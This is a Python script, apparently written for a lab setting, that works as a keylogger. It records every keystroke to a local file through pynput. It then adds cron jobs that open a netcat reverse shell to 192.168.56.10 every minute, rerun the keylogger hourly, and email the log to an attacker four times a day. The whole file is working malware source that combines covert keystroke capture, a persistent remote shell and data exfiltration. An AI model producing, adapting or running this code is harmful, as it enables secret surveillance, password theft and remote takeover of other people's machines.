#!/usr/bin/env python3
# Import necessary libraries
from pynput.keyboard import Key, Listener
import logging
from crontab import CronTab

# Initialize Log File
logging.basicConfig(filename=("keylog.txt"), level=logging.INFO, format="%(asctime)s - %(message)s")
# Initialize Variable
word=''
# Whenever a key is pressed:
def on_press(key):
    global word

# If the key is a space or the enter key, log the word go to the next line
    if key == Key.space or key == Key.enter or key == Key.tab:
        word += ' '
        logging.info(str(word))
        # Resets the word variable
        word = ''
    # If an arrow key is pressed, log the word, and the string below
    elif key == Key.up or key == Key.down or key == Key.left or key == Key.right:
        word += ' '
        logging.info(str(word + '-An arrow key was pressed-'))
        word =''
    # If the key pressed is a shift key, ignore it
    elif key == Key.shift_l or key == Key.shift_r:
        return
    # If either control key is pressed, ignore it
    elif key == Key.ctrl_l or key == Key.ctrl_r:
        return
    # If either command/super key is pressed, ignore it
    elif key == Key.cmd_l or key == Key.cmd_r:
        return
    # If backspace is pressed, remove the last character from the word variable
    elif key == Key.backspace:
        word = word[:-1]
    # Add the key pressed to the end of the word variable and remove the quotes around it for readability
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
    # If the escape key pressed, stop the program
    if key == Key.esc:
        return False

# Calls on the on_press function and keeps it running
with Listener(on_press=on_press) as listener:
    listener.join()

# Create a cronjob reverse shell to establish persistence
rev_cron = CronTab(user='kali')
job1 = rev_cron.new(command='/bin/nc –e /bin/bash 192.168.56.10 4444 >/dev/null 2>&1')
job1.minute.every(1)
rev_cron.write()

# Create a cronjob to run this script once an hour to make sure we keep capturing
key_cron = CronTab(user='kali')
job2 = key_cron.new(command='./PATH_TO_KEYLOGGER.PY')
job2.hour.every(1)
key_cron.write()

# Create a cronjob to send keylog.txt to attacker via email 4 times a day
mail_cron = CronTab(user='kali')
job3 = mail_cron.new(command='./PATH_TO_ATTACHMENTSS.PY')
job3.hour.every(6)
mail_cron.write()
